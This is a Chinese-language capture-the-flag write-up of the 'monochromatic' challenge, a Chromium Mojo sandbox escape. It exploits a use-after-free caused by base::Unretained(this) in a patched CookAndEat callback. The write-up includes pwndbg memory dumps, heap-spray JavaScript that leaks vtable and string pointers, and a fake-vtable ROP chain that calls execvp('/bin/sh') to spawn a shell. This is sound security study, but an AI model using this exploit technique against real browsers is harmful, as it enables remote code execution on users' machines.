# monochromatic

### 题目分析

```
+interface BeingCreatorInterface {
+  CreatePerson() => (blink.mojom.PersonInterface? person);
+  CreateDog() => (blink.mojom.DogInterface? dog);
+  CreateCat() => (blink.mojom.CatInterface? cat);
+};

+interface CatInterface {
+  GetName() => (string name);
+  SetName(string new_name) => ();
+  GetAge() => (uint64 age);
+  SetAge(uint64 new_age) => ();
+  GetWeight() => (uint64 weight);
+  SetWeight(uint64 new_weight) => ();
+  CookAndEat(blink.mojom.FoodInterface food) => ();
+};

+interface DogInterface {
+  GetName() => (string name);
+  SetName(string new_name) => ();
+  GetAge() => (uint64 age);
+  SetAge(uint64 new_age) => ();
+  GetWeight() => (uint64 weight);
+  SetWeight(uint64 new_weight) => ();
+  CookAndEat(blink.mojom.FoodInterface food) => ();
+};

+interface FoodInterface {
+  GetDescription() => (string description);
+  SetDescription(string new_description) => ();
+  GetWeight() => (uint64 weight);
+  SetWeight(uint64 new_weight) => ();
+};

+interface PersonInterface {
+  GetName() => (string name);
+  SetName(string new_name) => ();
+  GetAge() => (uint64 age);
+  SetAge(uint64 new_age) => ();
+  GetWeight() => (uint64 weight);
+  SetWeight(uint64 new_weight) => ();
+  CookAndEat(blink.mojom.FoodInterface food) => ();
+};
```
我们可以看到在补丁中添加了很多mojo接口的实现，除了food，所以我们需要在renderer进程中为他做一个实现。

```
function FoodInterfaceImpl() {
      this.binding = new mojo.Binding(blink.mojom.FoodInterface, this);
    }

    // Food interface implementation.
    FoodInterfaceImpl.prototype = {
        getDescription: async () => {
        },
        setDescription: async (arg) => {
        },
        getWeight: async () => {
        },
        setWeight: async (arg) => {
        },
    };

    // 3. Create Food object.
    let food_impl = new FoodInterfaceImpl();
    let food_impl_ptr = new blink.mojom.FoodInterfacePtr();
    food_impl.binding.bind(mojo.makeRequest(food_impl_ptr));
```

### 漏洞分析
首先先简述一下c++接口实现：

- c++的接口实现主要基于回调，接口实现的方法不会通过return语句返回值。相反，它的工作方式是方法期望一个回调作为一个参数(例如PersonInterfaceImpl::CookAndEat中的CookAndEatCallback callback参数)。调用这个回调通知该方法完成了它的执行，.run()的参数作为返回值（返回值数目大于等于1）。

上代码：
```
void PersonInterfaceImpl::AddWeight(
    PersonInterfaceImpl::CookAndEatCallback callback,
    blink::mojom::FoodInterfacePtr foodPtr, uint64_t weight_) {
  weight += weight_;
  std::move(callback).Run();
}

void PersonInterfaceImpl::CookAndEat(blink::mojom::FoodInterfacePtr foodPtr,
                                     CookAndEatCallback callback) {
  blink::mojom::FoodInterface *raw_food = foodPtr.get();

  raw_food->GetWeight(base::BindOnce(&PersonInterfaceImpl::AddWeight,
                                     base::Unretained(this),
                                     std::move(callback), std::move(foodPtr)));
}

//由于Food只有接口，具体的实现是由我们自己来控制的，这里先借用person的GetWeight来帮助理解
void PersonInterfaceImpl::GetWeight(GetWeightCallback callback) {
  std::move(callback).Run(weight);
}
```
- 我们从GetWeight看起，该方法的参数是一个回调，该方法执行完毕会将weight作为返回值传递给回调函数。

- 接下来看CookAndEat，在调用raw_food的GetWeight方法时，传递了一个参数，它是一个回调函数，这里通过base::BindOnce将AddWeight和执行所需要的参数绑定在一起（除了weight），GetWeight执行结束后会将weight传递给AddWeight并执行AddWeight。
- 最后在AddWeight中将获得的weight_参数加到当前的weight上。

漏洞点：base::Unretained(this)，被Unretained修饰的this指针，只由回调的调用者来保证回调执行时，this指针仍然可用。
- （以person为例）说人话就是：当我们的在food的GetWeight方法中free掉person，但是调用者（food）依旧可以保证this可用，这样的话AddWeight就可以修改被释放的内存。

### 漏洞利用

在漏洞利用之前，我们首先分析一下cat、dog、person的结构：

首先在content::BeingCreatorInterfaceImpl::CreateCat处下断点，查看CatInterfaceImple大小。
```
   0x555558750d9e    mov    qword ptr [rbp - 0x30], 0   0x555558750da6    mov    edi, 0x40 ► 0x555558750dab    call   0x55555a241230 <0x55555a241230> => operator new
```
从这里可以得到CatInterfaceImple的大小为0x40。


```
pwndbg> x/20gx 0x131643b24f400x131643b24f40:	0x000055555e515ae0 => vtable_table	0x0000131643ba55c0 => char *ptr;0x131643b24f50:	0x0000000000000030 => long length;	0x8000000000000040 => long capacity;0x131643b24f60:	0x0000000000000000 =>uint64_t age;	0x0000000000000000 => uint64_t weight;

pwndbg> x/20gx 0x0000131643ba55c00x131643ba55c0:	0x4141414141414100	0x41414141414141410x131643ba55d0:	0x4141414141414141	0x41414141414141410x131643ba55e0:	0x4141414141414141	0x41414141414141410x131643ba55f0:	0x0000000000000000	0x0000000000000000pwndbg> x/20gx 0x000055555e515ae00x55555e515ae0 <_ZTVN7content16CatInterfaceImplE+16>:	0x0000555558750190 => ~CatInterfaceImpl()	0x00005555587501d0 => AsWeakPtr()0x55555e515af0 <_ZTVN7content16CatInterfaceImplE+32>:	0x0000555558750210 => GetName()	0x0000555558750240 => SetName()0x55555e515b00 <_ZTVN7content16CatInterfaceImplE+48>:	0x0000555558750280 => GetAge()	0x00005555587502b0 => SetAge()
```

cat、dog、person三者的大致结构都是相同的，只是顺序有一些不同，我们这里就重点以猫猫🐱来入手，CatInterfaceImple中开头的8字节为虚函数表，后面是一个std::string name;这里因为要利用它伪造虚表，所以我们让他作为一个长字符串（std::string之前在mojo那题的wp里分析过一次了，这里就直接上链接了：https://github.com/yytgravity/Daily-learning-record/blob/master/chrome/plaid%202020%20mojo/wp.md#string ）name之后就是age和weight了

我们还会用到dog🐶，我们也介绍一下他：
```
0x00 vtable_table
0x08 uint64_t weight;
0x20 std::string name;
0x28 uint64_t age;
```

#### 激动人心的写利用时间：

##### 大体思路：

- 1、在我们自己实现的food的getweight方法中，free掉狗

- 2、分配一些猫，使猫落到狗之前的位置，并且将getweight的返回值设置为CatInterfaceImple的大小。
- 3、（便于描述，我们设正好落到freed狗位置的猫称为catA，A之后的猫为catB）由于第二步的设置，addweight就会使catA的name的*ptr指向catB的name。
- 4、对catB使用setname，将其name改为一个很大的值，这样就会free掉之前的内存，去指向新的大内存，这样catA就指向了那个被free的内存。
- 5、继续申请cat，使cat（设他为catC）落到catA指向的free的内存。
- 6、对catA使用getname方法，就可以获得catC中的vtable表指针和name指向的string的地址。（vtable指针可以计算出chrome的基地址，name指针可以用于伪造虚表）
- 7、将虚表中的setage处修改为找到的gadget，调用setage时就会触发rop

##### 具体实现

自定义的FoodInterfaceImpl接口方法实现：
```
function FoodInterfaceImpl() {
      this.binding = new mojo.Binding(blink.mojom.FoodInterface, this);
    }

    // Food interface implementation.
    FoodInterfaceImpl.prototype = {
        getDescription: async () => {
        },
        setDescription: async (arg) => {
        },
        getWeight: async () => {

          // 6. Free the last dog.
          dogs[dogs.length - 1].ptr.reset();

          // 7. Set names of the dogs.
          for (let i = dog_count - 1; i--; ) {
            dogs[i].setName('X'.repeat(sizeof_stringbuf * 100));
          }

          // 8. Create cats.
          cats = [];
          for (let i = 0; i < cat_count; ++i) {
            cats.push((await being_creator_interface_ptr.createCat()).cat);
          }

          // 9. Set names of cats, their capacity is the same as sizeof_CatInterfaceImpl. 
          // The first byte of the name is the id.
          for (let i = 0; i < cat_count; ++i) {
            await cats[i].setName(getIdString(i));
          }

          // 10. After return, CatInterfaceImpl::AddWeight is called. 
          // After feng shui a cat was created in the same place as the freed dog.
          // "weight += weight_;" adds to cat.name.ptr value sizeof_CatInterfaceImpl.
          // So now name.ptr of the cat points to the place right after the end of ptr data buffor,
          // which is name.ptr of some another cat.
          return {'weight': sizeof_CatInterfaceImpl};
        },
        setWeight: async (arg) => {
        },
    };

```

第2～6步：
```
    for (let A = 0; A < cat_count; ++A) {
      name = (await cats[A].getName()).name;
      if (name != getIdString(A)) {
      	let B = name.charCodeAt(0);
      	if (B < 0 || B >= cats.length) {
      		break;
      	}
        await cats[B].setName('B'.repeat(sizeof_stringbuf * 100));
        one_more_cat = (await being_creator_interface_ptr.createCat()).cat;
        fake_vtable_ptr = 'F'.repeat(0x100);
        success("debug");	
	      //debug();
        await one_more_cat.setName(fake_vtable_ptr);

        name = (await cats[A].getName()).name;
        vtable_ptr = getUint64(name, 0);
        str_ptr = getUint64(name, 8);
        success_value("vtable_ptr: ", vtable_ptr);
        success_value("str_ptr: ", str_ptr);
        base_offset = 0x8fc1ae0n;
        base_ptr = vtable_ptr - base_offset;
        if ((base_ptr & 0xffn) != 0n) {
        	break;
        }
```

rop：

我们打算调用execvp("/bin/sh", char *const argv[]);来getshell

这里需要一个gadget：

```
// 0x555557ef9ff9 <FT_Load_Glyph+121>:  mov    rdi,QWORD PTR [rax+0xb8]// 0x555557efa000 <FT_Load_Glyph+128>:  call   QWORD PTR [rdi+0x10]
```
我们可以用它来设置rdi（第一个参数即“/bin/sh”），此时的rax为fake vtable的地址，所以我们伪造时将execvp的plt安排在0x10处，之后将虚表中setAge的位置设置为gadget（+0x28），这样我们去调用setAge(x)，就可以同时达到设置rsi（参数二）和调用gadget的效果

setAge代码（由此可以得到设定rsi的方法）：
```
   0x5555587502b0 :    push   rbp
   0x5555587502b1 :    mov    rbp,rsp
   0x5555587502b4 :    sub    rsp,0x10
   0x5555587502b8 :    mov    QWORD PTR [rdi+0x20],rsi =>rdi+0x20为age所在地址，rsi为setAge要设定的值。
   0x5555587502bc :    mov    rdi,QWORD PTR [rdx]
   0x5555587502bf :    mov    QWORD PTR [rbp-0x8],rdi
   0x5555587502c3 :    mov    QWORD PTR [rdx],0x0
   0x5555587502ca :    call   QWORD PTR [rdi+0x8]
   0x5555587502cd :    lea    rdi,[rbp-0x8]
   0x5555587502d1 :    call   0x55555a192a80 <_ZN4base8internal12CallbackBaseD2Ev>
   0x5555587502d6 :    add    rsp,0x10
   0x5555587502da :    pop    rbp
   0x5555587502db :    ret
```

具体实现：
```
        // int execvp(const char *file, char *const argv[]);        // this is an adress of execvp@plt        execvp_ptr = base_ptr + 0x8f79940n;        // gadget_ptr sets rdi to "/bin/sh", rsi points to a good address when this gadget is called        // 0x555557ef9ff9 <FT_Load_Glyph+121>:  mov    rdi,QWORD PTR [rax+0xb8]        // 0x555557efa000 <FT_Load_Glyph+128>:  call   QWORD PTR [rdi+0x10]        gadget_ptr = base_ptr + 0x29a5ff9n;        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x28, gadget_ptr);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x10, execvp_ptr);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0xb8, str_ptr);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x58, str_ptr + 0x78n);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x60, str_ptr + 0x80n);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x68, str_ptr + 0x88n);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x70, 0n);        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x00, strToUint64('/bin/sh\x00'));        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x78, strToUint64('foo\x00'));        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x80, strToUint64('-c\x00'));        fake_vtable_ptr = setUint64(fake_vtable_ptr, 0x88, strToUint64('xeyes\x00'));        // 19. Call a virtual method. The vtable is fake so the gadget is called.        await one_more_cat.setName(fake_vtable_ptr);        name = setUint64(name, 0, str_ptr);        //success("debug");        //debug();        await cats[A].setName(name);        alert(await one_more_cat.setAge(str_ptr + 0x58n));
```